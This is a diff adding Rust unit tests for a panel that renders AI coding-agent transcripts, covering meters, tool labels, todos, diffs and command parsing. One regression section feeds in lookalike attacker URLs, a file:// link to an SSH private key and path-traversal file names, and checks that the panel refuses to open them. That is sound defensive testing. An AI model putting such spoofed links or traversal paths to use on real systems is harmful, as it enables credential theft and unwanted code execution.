+        over.context_used_percentage = Some(150.);
+        over.context_window_size = Some(200_000);
+        let meter = context_meter(Some(&over), &spend, false).expect("over");
+        assert!(
+            meter.fill.is_some_and(|fill| (0. ..=1.).contains(&fill)),
+            "150% must clamp fill to 0..=1, got {:?}",
+            meter.fill
+        );
+        assert!(
+            !meter.label.as_ref().contains("150"),
+            "150% must not appear unclamped in the label, got {}",
+            meter.label
+        );
+
+        let mut under = test_status_snapshot();
+        under.context_used_percentage = Some(-5.);
+        under.context_window_size = Some(200_000);
+        let meter = context_meter(Some(&under), &spend, false).expect("under");
+        assert!(
+            meter.fill.is_some_and(|fill| (0. ..=1.).contains(&fill)),
+            "a negative percentage must clamp fill to 0..=1, got {:?}",
+            meter.fill
+        );
+    }
+
+    #[test]
+    fn format_resets_at_ignores_non_positive_unix_times() {
+        assert_eq!(
+            format_resets_at(-1),
+            None,
+            "a negative resets_at must not render as a local date"
+        );
+        assert_eq!(
+            format_resets_at(0),
+            None,
+            "a zero resets_at must not render as a local date"
+        );
+        let later =
+            format_resets_at(1_700_000_000).expect("a real unix timestamp must still format");
+        assert!(
+            later.contains('-'),
+            "a real unix timestamp must still format as local time, got {later}"
+        );
+    }
+
+    #[test]
+    fn rate_limit_fact_formats_both_windows() {
+        assert_eq!(
+            rate_limit_fact(Some(23.), Some(41.)).as_deref(),
+            Some("5h 23% · 7d 41%")
+        );
+        assert_eq!(rate_limit_fact(Some(23.), None).as_deref(), Some("5h 23%"));
+        assert_eq!(rate_limit_fact(None, Some(41.)).as_deref(), Some("7d 41%"));
+        assert_eq!(rate_limit_fact(None, None), None);
+    }
+
+    #[test]
+    fn structured_patch_text_separates_hunks_with_headers() {
+        let text = structured_patch_text(Some(&serde_json::json!({
+            "structuredPatch": [
+                { "oldStart": 1, "newStart": 1, "lines": ["-a", "+b"] },
+                { "oldStart": 40, "newStart": 41, "lines": ["-c", "+d"] }
+            ]
+        })))
+        .expect("hunks");
+        assert!(text.contains("@@ -1,+1 @@"), "{text}");
+        assert!(text.contains("@@ -40,+41 @@"), "{text}");
+    }
+
+    #[test]
+    fn auto_mode_flags_are_named_in_the_permission_tooltip() {
+        let tooltip = auto_mode_tooltip(
+            Some("auto"),
+            Some(AutoModeFlags {
+                bash_first: true,
+                steer_only: true,
+                bypass: false,
+            }),
+        );
+        assert!(tooltip.contains("auto"));
+        assert!(tooltip.contains("bash-first"));
+        assert!(tooltip.contains("steer-only"));
+        assert!(!tooltip.contains("bypass"));
+    }
+
+    #[test]
+    fn ai_title_wins_over_the_registry_name() {
+        assert_eq!(
+            preferred_name(Some("Later title"), Some("registry name"), "session-id"),
+            "Later title"
+        );
+        assert_eq!(
+            preferred_name(None, Some("registry name"), "session-id"),
+            "registry name"
+        );
+    }
+
+    #[test]
+    fn tool_target_prefers_file_path() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "Read",
+                serde_json::json!({ "file_path": "/a/b/c.rs", "path": "ignored" }),
+            ))
+            .as_ref(),
+            "/a/b/c.rs"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_path() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "Glob",
+                serde_json::json!({ "path": "/src" })
+            ))
+            .as_ref(),
+            "/src"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_pattern() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "Glob",
+                serde_json::json!({ "pattern": "**/*.rs" })
+            ))
+            .as_ref(),
+            "**/*.rs"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_url() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "WebFetch",
+                serde_json::json!({ "url": "https://example.com" }),
+            ))
+            .as_ref(),
+            "https://example.com"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_query() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "WebSearch",
+                serde_json::json!({ "query": "zed editor" })
+            ))
+            .as_ref(),
+            "zed editor"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_command() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "Bash",
+                serde_json::json!({ "command": "ls -la" })
+            ))
+            .as_ref(),
+            "ls -la"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_description() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "Agent",
+                serde_json::json!({ "description": "explore the crate" }),
+            ))
+            .as_ref(),
+            "explore the crate"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_skill() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "Skill",
+                serde_json::json!({ "skill": "codegraph" })
+            ))
+            .as_ref(),
+            "codegraph"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_prompt_first_line() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "Agent",
+                serde_json::json!({ "prompt": "first line\nsecond line" }),
+            ))
+            .as_ref(),
+            "first line"
+        );
+    }
+
+    #[test]
+    fn tool_target_falls_back_to_the_first_string_field() {
+        assert_eq!(
+            tool_target(&tool_use_block(
+                "Mystery",
+                serde_json::json!({ "count": 3, "label": "named" }),
+            ))
+            .as_ref(),
+            "named"
+        );
+    }
+
+    #[test]
+    fn mcp_names_split_into_server_and_tool() {
+        assert_eq!(
+            mcp_tool_parts("mcp__github__list_issues"),
+            Some(("github", "list_issues"))
+        );
+        assert_eq!(mcp_tool_parts("Bash"), None);
+    }
+
+    #[test]
+    fn an_edit_diff_marks_a_one_line_change() {
+        let diff = edit_diff_text("old\n", "new\n");
+        assert!(diff.contains("-old"), "got {diff:?}");
+        assert!(diff.contains("+new"), "got {diff:?}");
+    }
+
+    #[test]
+    fn an_edit_diff_handles_an_empty_old_string() {
+        let diff = edit_diff_text("", "new\n");
+        assert!(diff.contains("+new"), "got {diff:?}");
+        assert!(!diff.contains("-new"), "got {diff:?}");
+    }
+
+    #[test]
+    fn todowrite_parses_three_statuses() {
+        let todos = parse_todos(&serde_json::json!({
+            "todos": [
+                {"content": "one", "status": "pending"},
+                {"content": "two", "status": "in_progress"},
+                {"content": "three", "status": "completed"}
+            ]
+        }))
+        .expect("three well-formed todos");
+        assert_eq!(todos.len(), 3);
+        assert!(matches!(todos[0].status, TodoStatus::Pending));
+        assert!(matches!(todos[1].status, TodoStatus::InProgress));
+        assert!(matches!(todos[2].status, TodoStatus::Completed));
+    }
+
+    #[test]
+    fn ask_user_question_shows_the_question_and_options() {
+        let questions = parse_asked_questions(&serde_json::json!({
+            "questions": [{
+                "question": "Which extras?",
+                "options": [{ "label": "CodeGraph" }, { "label": "Tests" }]
+            }]
+        }))
+        .expect("a well-formed question");
+        assert_eq!(questions[0].question.as_ref(), "Which extras?");
+        assert_eq!(questions[0].options.len(), 2);
+        assert_eq!(
+            pretty_ask_user_answers(r#"{"answers":[{"label":"CodeGraph"},{"label":"Tests"}]}"#)
+                .as_ref(),
+            "CodeGraph\nTests"
+        );
+    }
+
+    #[test]
+    fn malformed_questions_and_todos_degrade_without_panicking() {
+        assert!(
+            parse_asked_questions(&serde_json::json!({ "questions": "not an array" })).is_none()
+        );
+        assert!(
+            parse_todos(&serde_json::json!({
+                "todos": [{ "content": "missing status" }]
+            }))
+            .is_none()
+        );
+        assert!(
+            structured_patch_text(Some(&serde_json::json!({
+                "structuredPatch": { "not": "an array" }
+            })))
+            .is_none()
+        );
+    }
+
+    #[test]
+    fn an_image_block_in_a_tool_result_is_an_image_entry() {
+        let entries = entries_of(&[
+            r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"t1","name":"Read","input":{}}]}}"#,
+            r#"{"type":"user","uuid":"b","message":{"content":[{"type":"tool_result","tool_use_id":"t1","content":[{"type":"text","text":"see this"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AAAABBBB"}}]}]}}"#,
+        ]);
+        assert!(
+            entries
+                .iter()
+                .any(|entry| matches!(entry.kind, EntryKind::Image { .. })),
+            "an image block in a result must be drawn as an image"
+        );
+        assert!(entries.iter().any(|entry| matches!(
+            &entry.kind,
+            EntryKind::ToolResult { body: ToolResultBody::Inline(text), .. } if text.as_ref() == "see this"
+        )));
+    }
+
+    #[test]
+    fn sent_files_carry_is_error() {
+        let line = serde_json::json!({
+            "type": "user",
+            "uuid": "b",
+            "message": { "content": [ {
+                "type": "tool_result",
+                "tool_use_id": "t1",
+                "is_error": true,
+                "content": "delivery failed",
+            } ] },
+            "toolUseResult": {
+                "caption": "caption",
+                "attachments": [{
+                    "path": "/home/coder/project/shot.png",
+                    "size": 2048,
+                    "isImage": true,
+                    "media_type": "image/png",
+                }],
+            },
+        })
+        .to_string();
+        let entries = entries_of(&[TOOL_USE_LINE, &line]);
+        match entries.get(1).map(|entry| &entry.kind) {
+            Some(EntryKind::SentFiles { is_error, .. }) => {
+                assert!(*is_error, "the delivery's is_error must be carried");
+            }
+            _ => panic!("expected sent files"),
+        }
+    }
+
+    #[test]
+    fn an_oversized_sent_image_is_confirmable_instead_of_refused() {
+        let (_, files) = sent_files_of(&send_user_file_line(
+            serde_json::json!([{
+                "path": "/home/coder/project/huge.png",
+                "size": 8_000_000,
+                "isImage": true,
+                "media_type": "image/png",
+            }]),
+            "huge",
+        ));
+        let size = files[0].size.expect("the delivery recorded a size");
+        assert!(size > MAX_SENT_IMAGE_BYTES);
+        assert!(size <= MAX_SENT_IMAGE_BYTES_ABSOLUTE);
+        assert!(sent_image_format(&files[0]).is_some());
+    }
+
+    #[test]
+    fn line_changes_are_a_toolbar_fact() {
+        assert_eq!(line_change_fact(156, 23).as_deref(), Some("+156 −23 lines"));
+    }
+
+    // Review round 1 regressions.
+
+    #[test]
+    fn a_bridge_status_link_is_only_offered_for_a_claude_ai_url() {
+        let offered = |url: &str| {
+            let line = format!(
+                r#"{{"type":"system","subtype":"bridge_status","uuid":"a","content":"connected","url":"{url}"}}"#
+            );
+            match &entries_of(&[&line])[0].kind {
+                EntryKind::SystemNote { url, .. } => url.clone(),
+                _ => panic!("expected a system note for a bridge_status record"),
+            }
+        };
+
+        // The link is a button that hands the string to the machine's URL opener, so a
+        // transcript naming anything but the bridge must not produce one.
+        for refused in [
+            "file:///Users/reader/.ssh/id_ed25519",
+            "http://claude.ai/code/session_01",
+            "https://claude.ai.attacker.example/code/session_01",
+            "https://claude.aievil.com/x",
+            "not a url at all",
+        ] {
+            assert_eq!(
+                offered(refused).as_deref(),
+                None,
+                "expected no link for {refused:?}, got {:?}",
+                offered(refused)
+            );
+        }
+
+        // The bridge's own URL is legal input and must still be offered.
+        assert_eq!(
+            offered("https://claude.ai/code/session_01").as_deref(),
+            Some("https://claude.ai/code/session_01"),
+            "the bridge's own URL must stay a link"
+        );
+    }
+
+    #[test]
+    fn a_sent_file_outside_the_session_is_not_opened() {
+        let working_directory = Path::new("/home/coder/project");
+
+        // A path the panel would refuse to read must not be a path it asks the OS to
+        // open: opening one runs whatever is registered for it.
+        for refused in [
+            "/home/coder/.ssh/id_ed25519",
+            "/Applications/Calculator.app",
+            "/home/coder/project/../secrets/open-me.command",
+            "relative/shot.png",
+        ] {
+            assert!(
+                !sent_path_is_openable(Path::new(refused), working_directory),
+                "expected {refused} to be refused, it was offered to the OS opener"
+            );
+        }
+
+        // What a session really does send: a file under its own working directory, and
+        // one written to a temporary directory.
+        for allowed in [
+            "/home/coder/project/shot.png",
+            "/home/coder/project/out/report.mp4",
+            "/tmp/claude-shot.png",
+            "/private/tmp/claude-shot.png",
+        ] {
+            assert!(
+                sent_path_is_openable(Path::new(allowed), working_directory),
+                "expected {allowed} to stay openable, it was refused"
+            );
+        }
+    }
+
+    #[test]
+    fn a_very_large_edit_is_not_diffed_line_by_line() {
+        let old_string = "one line of the file\n".repeat(20_000);
+        let new_string = "another line of the file\n".repeat(20_000);
+        let input = serde_json::json!({
+            "file_path": "/home/coder/project/big.rs",
+            "old_string": old_string,
+            "new_string": new_string,
+        });
+
+        let diff = edit_input_diff(&input).expect("an edit with both strings has a diff");
+        assert!(
+            diff.len() <= 200,
+            "an edit this large must be summarized rather than diffed line by line; got \
+             {} characters starting {:?}",
+            diff.len(),
+            diff.chars().take(60).collect::<String>()
+        );
+
+        // An edit of an ordinary size is legal input and must still be a real diff.
+        let small = serde_json::json!({
+            "old_string": "the old line\n",
+            "new_string": "the new line\n",
+        });
+        assert_eq!(
+            edit_input_diff(&small).as_deref(),
+            Some("-the old line\n+the new line\n"),
+            "an ordinary edit must still be diffed"
+        );
+    }
+
+    #[test]
+    fn the_todo_header_counts_what_is_done_and_names_what_is_running() {
+        let todos = vec![
+            TodoItem {
+                content: "read the spec".into(),
+                status: TodoStatus::Completed,
+            },
+            TodoItem {
+                content: "write the findings".into(),
+                status: TodoStatus::Completed,
+            },
+            TodoItem {
+                content: "land the red tests".into(),
+                status: TodoStatus::InProgress,
+            },
+            TodoItem {
+                content: "fix to green".into(),
+                status: TodoStatus::Pending,
+            },
+        ];
+        assert_eq!(
+            todo_summary(&todos).as_ref(),
+            "Todo · 2/4 done · land the red tests",
+            "a collapsed checklist has to say how far it is and what is running"
+        );
+
+        // A list with nothing running says only how far it is.
+        let done = vec![TodoItem {
+            content: "read the spec".into(),
+            status: TodoStatus::Completed,
+        }];
+        assert_eq!(todo_summary(&done).as_ref(), "Todo · 1/1 done");
+    }
+
+    #[test]
+    fn the_bash_first_steer_is_named_in_the_permission_tooltip() {
+        let tooltip = permission_tooltip(
+            Some("acceptEdits"),
+            Some(AutoModeFlags {
+                bash_first: true,
+                steer_only: false,
+                bypass: false,
+            }),
+            Some("strict"),
+        );
+        assert!(
+            tooltip.contains("strict"),
+            "the steer the auto_mode attachment recorded has to reach the tooltip; got \
+             {tooltip:?}"
+        );
+
+        // Nothing is invented for a session that recorded no steer.
+        let without = permission_tooltip(Some("acceptEdits"), Some(AutoModeFlags::default()), None);
+        assert!(
+            !without.contains("steer:"),
+            "a session with no steer must not be given one; got {without:?}"
+        );
+    }
+
+    #[test]
+    fn a_peer_handback_without_origin_fields_is_not_the_reader() {
+        let entries = entries_of(&[
+            r#"{"type":"user","uuid":"a","message":{"content":"<task-notification>\n<task-id>t1</task-id>\n<status>completed</status>\n</task-notification>\n\nAnother Claude session sent a message:\n<agent-message from=\"Explore\">the review is done</agent-message>"}}"#,
+        ]);
+        let message = entries.iter().find_map(|entry| match &entry.kind {
+            EntryKind::Message { role, source, .. } => Some((role.clone(), source.clone())),
+            _ => None,
+        });
+        match message {
+            Some((role, source)) => {
+                assert!(
+                    matches!(role, MessageRole::Peer { .. }),
+                    "a hand-back from another session is not the reader's own message; got \
+                     role {role:?} for {source:?}"
+                );
+                assert_eq!(
+                    source.as_ref(),
+                    "the review is done",
+                    "the wrapper is not part of what was said"
+                );
+            }
+            None => panic!(
+                "the hand-back must reach the conversation as a peer message; no message \
+                 entry was built at all"
+            ),
+        }
+    }
+
+    #[test]
+    fn a_message_quoting_the_peer_wrapper_is_still_the_readers_own() {
+        // The legal input the rule above could wrongly take: the reader writing about the
+        // wrapper rather than a session sending one.
+        let entries = entries_of(&[
+            r#"{"type":"user","uuid":"a","message":{"content":"why does <agent-message from=\"Explore\"> show up in my panel?"}}"#,
+        ]);
+        match &entries[0].kind {
+            EntryKind::Message { role, .. } => assert_eq!(
+                role,
+                &MessageRole::User,
+                "a message that merely quotes the wrapper stays the reader's own"
+            ),
+            _ => panic!("expected a message"),
+        }
+    }
+
+    #[test]
+    fn a_dispatch_flag_is_read_from_a_flag_and_not_from_a_substring() {
+        let dispatch = parse_cli_dispatch(
+            "node --max-old-space-size=512 script.ts && agy --print-timeout 30m -p \"$(cat /tmp/promptA.txt)\"",
+        )
+        .expect("an agy command is a dispatch");
+        assert_eq!(
+            dispatch.model.as_deref(),
+            None,
+            "a command with no model flag has no model; the -m inside \
+             --max-old-space-size is not one"
+        );
+
+        // The model flags that are really written must still be read.
+        assert_eq!(
+            parse_cli_dispatch("codex exec -m gpt-6-astra -c model_reasoning_effort=\"xhigh\"")
+                .and_then(|dispatch| dispatch.model)
+                .as_deref(),
+            Some("gpt-6-astra")
+        );
+        assert_eq!(
+            parse_cli_dispatch(
+                "agent -f --trust -p \"$(cat /tmp/p.txt)\" --model \"cursor-grok-4.6-high\""
+            )
+            .and_then(|dispatch| dispatch.model)
+            .as_deref(),
+            Some("cursor-grok-4.6-high")
+        );
+    }
+
+    #[test]
+    fn a_redirect_inside_the_prompt_is_not_the_log_file() {
+        let dispatch = parse_cli_dispatch(
+            "agent -f --trust -p \"say whether a > b\" --model m > /tmp/run.log && echo \"x > y\"",
+        )
+        .expect("an agent command is a dispatch");
+        assert_eq!(
+            dispatch.log_path.as_deref(),
+            Some(Path::new("/tmp/run.log")),
+            "the log is the command's own redirect, not a > inside the prompt"
+        );
+    }
+
+    #[test]
+    fn a_dispatch_prompt_read_outlives_the_next_rebuild() {
+        let entries = vec![Entry {
+            key: SharedString::from("record-a#0"),
+            kind: EntryKind::ToolUse {
+                name: SharedString::from(BASH_TOOL_NAME),
+                input: SharedString::from(
+                    r#"{"command":"agy --model gemini-3.8-flash-high -p \"$(cat /tmp/p.txt)\""}"#,
+                ),
+                id: None,
+                diff: None,
+            },
+        }];
+        let keys = live_cache_keys(&entries);
+        let wanted = dispatch_prompt_key(&entries[0].key);
+        assert!(
+            keys.contains(&wanted),
+            "the read of a dispatch card's prompt is dropped by the next rebuild unless \
+             its key is live; wanted {wanted}, got {:?}",
+            keys.iter().map(SharedString::as_ref).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn a_turn_duration_written_as_a_float_is_still_a_duration() {
+        let entries = entries_of(&[
+            r#"{"type":"system","subtype":"turn_duration","uuid":"a","durationMs":272000.0,"messageCount":209.0,"pendingBackgroundAgentCount":2}"#,
+        ]);
+        match &entries[0].kind {
+            EntryKind::TurnFooter {
+                duration_ms,
+                message_count,
+                pending_background_agents,
+            } => {
+                assert_eq!(
+                    (*duration_ms, *message_count, *pending_background_agents),
+                    (272_000, 209, 2),
+                    "a float is how JSON writes a whole number too"
+                );
+            }
+            _ => panic!("expected a turn footer"),
+        }
+
+        // A field that is missing is still nothing, not a guess.
+        let entries = entries_of(&[
+            r#"{"type":"system","subtype":"turn_duration","uuid":"a","durationMs":1000}"#,
+        ]);
+        match &entries[0].kind {
+            EntryKind::TurnFooter {
+                duration_ms,
+                message_count,
+                ..
+            } => assert_eq!((*duration_ms, *message_count), (1000, 0)),
+            _ => panic!("expected a turn footer"),
+        }
+    }
+
+    const EDIT_CALL_LINE: &str = r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"toolu_edit","name":"Edit","input":{"file_path":"/home/coder/project/main.rs","old_string":"the old line\n","new_string":"the new line\n"}}]}}"#;
+    const EDIT_RESULT_LINE: &str = r#"{"type":"user","uuid":"b","toolUseResult":{"filePath":"/home/coder/project/main.rs","structuredPatch":[{"oldStart":1,"oldLines":1,"newStart":1,"newLines":1,"lines":["-the old line","+the new line"]}]},"message":{"content":[{"type":"tool_result","tool_use_id":"toolu_edit","content":"applied"}]}}"#;
+
+    #[test]
+    fn an_edit_carries_its_diff_in_the_entry_it_is_drawn_from() {
+        let records = [record(EDIT_CALL_LINE)];
+        let path: Vec<&TranscriptRecord> = records.iter().collect();
+        let mut cache = EntryCache::default();
+
+        let entries = build_entries(&path, None, &mut cache);
+        match &entries[0].kind {
+            EntryKind::ToolUse { diff, .. } => assert_eq!(
+                diff.as_deref(),
+                Some("-the old line\n+the new line\n"),
+                "the diff belongs to the entry, which is derived once, and not to the \
+                 frame, which is drawn many times a second"
+            ),
+            _ => panic!("expected a tool call"),
+        }
+
+        let derived = cache.derived;
+        let again = build_entries(&path, None, &mut cache);
+        assert_eq!(
+            cache.derived,
+            derived,
+            "a rebuild must reuse the diff it already derived; it derived {} more",
+            cache.derived.saturating_sub(derived)
+        );
+        assert!(again == entries, "a rebuild must produce the same entries");
+    }
+
+    #[test]
+    fn an_edit_answered_with_a_patch_is_diffed_once() {
+        let records = [record(EDIT_CALL_LINE), record(EDIT_RESULT_LINE)];
+        let path: Vec<&TranscriptRecord> = records.iter().collect();
+        let patched = calls_answered_with_a_patch(&path);
+        assert!(
+            patched.contains(&SharedString::from("toolu_edit")),
+            "the result carries a structuredPatch, so its call is answered with one; got \
+             {:?}",
+            patched.iter().map(SharedString::as_ref).collect::<Vec<_>>()
+        );
+
+        let diff = SharedString::from("-the old line\n+the new line\n");
+        let answered = SharedString::from("toolu_edit");
+        assert_eq!(
+            edit_card_diff(Some(&diff), Some(&answered), &patched),
+            None,
+            "the patch on the result is the one diff for this call; the card must not \
+             draw a second one"
+        );
+
+        // A call the transcript has no result for yet, and one whose result carries no
+        // patch, still show the diff of what they were asked to change.
+        let running = SharedString::from("toolu_running");
+        assert_eq!(
+            edit_card_diff(Some(&diff), Some(&running), &patched),
+            Some(&diff),
+            "a call that has not been answered keeps the diff of its own input"
+        );
+        assert_eq!(
+            edit_card_diff(Some(&diff), None, &patched),
+            Some(&diff),
+            "a call whose block carried no id keeps the diff of its own input"
         );
     }
 }
